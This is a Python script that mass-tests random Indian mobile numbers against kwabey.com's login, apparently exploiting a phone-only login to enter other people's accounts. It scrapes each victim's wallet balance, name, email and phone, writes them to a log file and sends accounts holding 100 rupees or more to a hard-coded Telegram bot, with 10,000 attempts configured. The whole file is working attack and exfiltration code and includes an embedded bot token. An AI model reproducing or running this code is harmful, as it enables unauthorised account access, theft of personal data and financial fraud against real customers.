# ************************************************************************************
#  Script Design and Development by: Denji - Kun
#  Purpose: Automate login, retrieve wallet balance, and fetch account details
# ************************************************************************************

import requests
import random
import time
import json
from bs4 import BeautifulSoup
from datetime import datetime

# ************************************************************************************
#                         CREDIT: Script by Denji - Kun
# ************************************************************************************

# Define headers to mimic a regular browser request
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
}

# Your Telegram Bot token and Chat ID
BOT_TOKEN = '7636633813:AAGgCzBsaFu3V_8T-qaXzrqeX46ILnppj4E'
CHAT_ID = '7107390711'

# Function to send message to Telegram
def send_to_telegram(message, bot_token, chat_id):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': message
    }
    headers = {'Content-Type': 'application/json'}
    response = requests.post(url, data=json.dumps(payload), headers=headers)
    return response.status_code == 200

# Function to generate a random 10-digit Indian mobile number
def generate_random_mobile():
    first_digit = random.choice(['6', '7', '8', '9'])
    remaining_digits = ''.join(random.choices('0123456789', k=9))
    return first_digit + remaining_digits

# Function to initiate login with a random mobile number
def initiate_login(session, mobile_number):
    login_url = "https://kwabey.com/user/profile/"
    data = {'mobile': mobile_number}
    response = session.post(login_url, headers=headers, data=data)
    return response.status_code == 200

# ************************************************************************************
#                         Designed by Denji - Kun
# ************************************************************************************

# Function to check wallet balance and retrieve account details
def check_wallet_balance_and_details(session, sno):
    wallet_url = "https://kwabey.com/user/wallet/"
    response = session.get(wallet_url, headers=headers)
    soup = BeautifulSoup(response.content, 'html.parser')
    
    # Extract balance
    balance = "Balance not found"
    balance_label = soup.find("div", class_="orders_page_order_id_container")
    if balance_label and "Total Available Balance" in balance_label.text:
        balance_amount = balance_label.find_next_sibling("div", class_="orders_page_order_status_container")
        if balance_amount:
            balance_span = balance_amount.find("span", class_="orders_page_order_status_span")
            if balance_span:
                balance = balance_span.text.strip()

    # Extract email, phone, and full name
    email = soup.find("span", {"id": "user_email"}).text if soup.find("span", {"id": "user_email"}) else "Email not found"
    phone = soup.find("span", {"id": "user_phone"}).text if soup.find("span", {"id": "user_phone"}) else "Phone not found"
    full_name = soup.find("span", {"id": "user_name"}).text if soup.find("span", {"id": "user_name"}) else "Name not found"

    # Print the detailed results
    print(f"Checking sno: {sno}")
    print(f"Response status code: {response.status_code}")
    print(f"Found amount: {balance}")
    print(f"Found email: {email}, phone: {phone}, full name: {full_name}")

    return {
        "sno": sno,
        "email": email,
        "phone": phone,
        "full_name": full_name,
        "balance": balance
    }

# Main function to handle multiple logins and balance checks
def mass_login_and_check(count=5, log_to_file=False):
    session = requests.Session()
    results = {}
    sno = 1

    for _ in range(count):
        mobile_number = generate_random_mobile()

        # Attempt login and confirm success
        if initiate_login(session, mobile_number):
            print(f"{datetime.now()} - Login successful for {mobile_number}")

            # Retrieve balance and account details
            result = check_wallet_balance_and_details(session, sno)
            results[sno] = result

            # Optional logging to file
            if log_to_file:
                with open("detailed_balance_log.txt", "a", encoding="utf-8") as log_file:
                    log_file.write(
                        f"{datetime.now()} - Sno: {sno}, Email: {result['email']}, "
                        f"Phone: {result['phone']}, Name: {result['full_name']}, Balance: {result['balance']}\n"
                    )

            # Check if balance >= 100 and send to Telegram
            try:
                balance_value = float(result['balance'].replace('₹', '').replace(',', '').strip())
                if balance_value >= 100:
                    message = (
                        f"✅ High Balance Alert!\n"
                        f"Sno: {sno}\n"
                        f"Name: {result['full_name']}\n"
                        f"Phone: {result['phone']}\n"
                        f"Email: {result['email']}\n"
                        f"Balance: {result['balance']}"
                    )
                    sent = send_to_telegram(message, BOT_TOKEN, CHAT_ID)
                    if sent:
                        print(f"Message sent to Telegram for Sno: {sno}")
                    else:
                        print(f"Failed to send message to Telegram for Sno: {sno}")
            except Exception as e:
                print(f"Error parsing balance for sno {sno}: {e}")

            sno += 1
        else:
            print(f"{datetime.now()} - Login failed for {mobile_number}")

        time.sleep(1)  # Delay between checks
    return results

# ************************************************************************************
#                         Designed and Coded by OwnerxD_699
# ************************************************************************************

# Example usage
balances = mass_login_and_check(count=10000, log_to_file=True)  # Test with 10000 random numbers
print("Final results:", balances)
